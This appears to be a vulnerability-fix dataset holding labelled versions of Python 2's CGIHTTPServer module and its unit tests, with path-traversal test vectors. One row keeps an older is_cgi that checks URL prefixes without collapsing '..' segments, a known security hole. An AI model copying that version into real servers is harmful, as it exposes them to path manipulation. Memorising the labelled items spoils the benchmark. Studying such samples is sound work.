                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
6,923ba361d8f757f0656cfd216525aca4848e02aa,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
7,923ba361d8f757f0656cfd216525aca4848e02aa,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
